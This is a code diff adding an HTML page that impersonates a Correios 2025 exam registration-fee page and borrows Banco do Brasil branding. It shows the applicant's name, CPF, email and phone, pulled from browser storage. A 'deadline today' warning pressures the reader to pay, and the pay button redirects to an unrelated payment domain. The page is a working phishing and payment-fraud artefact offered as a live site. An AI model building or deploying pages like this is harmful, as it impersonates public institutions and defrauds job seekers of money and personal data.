@@ -1,0 +1,157 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Correios - Inscrição Concurso 2025 | Taxa de Inscrição</title>
+  
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'bb-yellow': '#FEEF37',
+            'bb-blue': '#003DA5',
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+  <!-- TOPO AMARELO (LOGO E TÍTULO) -->
+  <header class="bg-bb-yellow py-6 flex flex-col items-center justify-center shadow-md">
+    <!-- Logo BB -->
+    <img src="images/uDnvve3cM2Rm.png" alt="Logo do Banco do Brasil" class="h-12 mb-2">
+    <!-- Texto principal -->
+    <p class="text-bb-blue font-bold text-2xl tracking-wide">
+      CONCURSO PÚBLICO 2025
+    </p>
+    <p class="text-bb-blue text-sm tracking-wider">
+      SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+    </p>
+  </header>
+
+  <!-- BARRA AZUL (TAXA DE INSCRIÇÃO) -->
+  <nav class="bg-bb-blue py-3 shadow-md">
+    <div class="container mx-auto px-4 flex items-center justify-center">
+      <span class="text-white text-xl font-semibold tracking-wide">
+        TAXA DE INSCRIÇÃO
+      </span>
+    </div>
+  </nav>
+
+  <!-- CONTEÚDO PRINCIPAL -->
+  <main class="container mx-auto px-4 py-8 flex-grow max-w-3xl">
+    <!-- Card principal -->
+    <div class="bg-white rounded-lg shadow-lg p-6 space-y-6">
+      
+      <!-- AVISO IMPORTANTE (box amarelo) -->
+      <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4 flex items-start">
+        <div class="mr-3">
+          <!-- Ícone de alerta (exclamation) do Heroicons -->
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-yellow-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M5.12 19.21A9 9 0 1118.88 4.79a9 9 0 01-13.76 14.42z"></path>
+          </svg>
+        </div>
+        <div class="text-sm text-yellow-800">
+          <p class="font-semibold mb-1">AVISO IMPORTANTE</p>
+          <p>
+            Para finalizar sua inscrição no Concurso dos Correios 2025, 
+            é necessário efetuar o pagamento da taxa de inscrição.
+          </p>
+        </div>
+      </div>
+
+      <!-- CONFIRMAÇÃO DOS DADOS (card) -->
+      <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
+        <p class="font-semibold text-gray-800 mb-2">Confirmação dos Dados:</p>
+        <p class="text-sm text-gray-700 mb-1">
+          <strong>Nome:</strong> <span id="nomeCandidato" class="ml-1">Não informado</span>
+        </p>
+        <p class="text-sm text-gray-700 mb-1">
+          <strong>CPF:</strong> <span id="cpfCandidato" class="ml-1">Não informado</span>
+        </p>
+        <p class="text-sm text-gray-700 mb-1">
+          <strong>Email:</strong> <span id="emailCandidato" class="ml-1">Não informado</span>
+        </p>
+        <p class="text-sm text-gray-700">
+          <strong>Telefone:</strong> <span id="telefoneCandidato" class="ml-1">Não informado</span>
+        </p>
+      </div>
+
+      <!-- PRAZO FINAL (box vermelho) -->
+      <div class="bg-red-50 border border-red-200 rounded-lg p-4 flex items-start">
+        <div class="mr-3">
+          <!-- Ícone de relógio do Heroicons -->
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6l4 2"></path>
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 20a8 8 0 100-16 8 8 0 000 16z"></path>
+          </svg>
+        </div>
+        <div class="text-sm text-red-800">
+          <p class="font-semibold mb-1">PRAZO FINAL</p>
+          <p>
+            O prazo para pagamento da taxa de inscrição se encerra 
+            <strong>hoje</strong>.
+          </p>
+        </div>
+      </div>
+
+      <!-- BOTÃO PAGAR TAXA DE INSCRIÇÃO -->
+      <div class="text-center">
+        <button id="btnPagar" class="bg-bb-blue text-white font-medium py-3 px-8 rounded-md 
+                 hover:bg-blue-800 transition duration-200 text-lg inline-flex items-center shadow-md">
+          <!-- Ícone de cartão de crédito do Heroicons -->
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
+            <path d="M2 5a2 2 0 012-2h12a2 2 0 012 2v2H2V5z"></path>
+            <path fill-rule="evenodd" d="M2 9h16v6a2 2 0 01-2 2H4a2 2 0 01-2-2V9zm4 3a1 1 0 102 0 1 1 0 00-2 0z" clip-rule="evenodd"></path>
+          </svg>
+          PAGAR TAXA DE INSCRIÇÃO
+        </button>
+      </div>
+    </div>
+  </main>
+
+  <!-- RODAPÉ -->
+  <footer class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
+    <p class="text-sm font-medium">
+      © 2025 Correios S.A. Todos os direitos reservados.
+    </p>
+    <p class="text-sm mt-1">
+      Central de Atendimento Correios - 0800 729 0722
+    </p>
+  </footer>
+
+  <!-- SCRIPT PARA LER DADOS DO localStorage (ou query) E REDIRECIONAR -->
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      // Leia do localStorage (ou use query string, se preferir)
+      const nome     = localStorage.getItem("nomeCandidato")     || "";
+      const cpf      = localStorage.getItem("cpfCandidato")      || "";
+      const email    = localStorage.getItem("emailCandidato")    || "";
+      const telefone = localStorage.getItem("telefoneCandidato") || "";
+
+      // Preenche nos elementos HTML
+      document.getElementById("nomeCandidato").textContent     = nome     || "Não informado";
+      document.getElementById("cpfCandidato").textContent      = cpf      || "Não informado";
+      document.getElementById("emailCandidato").textContent    = email    || "Não informado";
+      document.getElementById("telefoneCandidato").textContent = telefone || "Não informado";
+
+      // Ao clicar no botão, redireciona para checkout.com
+      document.getElementById("btnPagar").addEventListener("click", () => {
+        window.location.href = "https://pay.inscricao-brasil.lat/P5LNZ8znbDYgaRy";
+      });
+    });
+  </script>
+
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl508546'},{'dcenter':'p3'},{'cp_id':'10284161'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script></body></html>
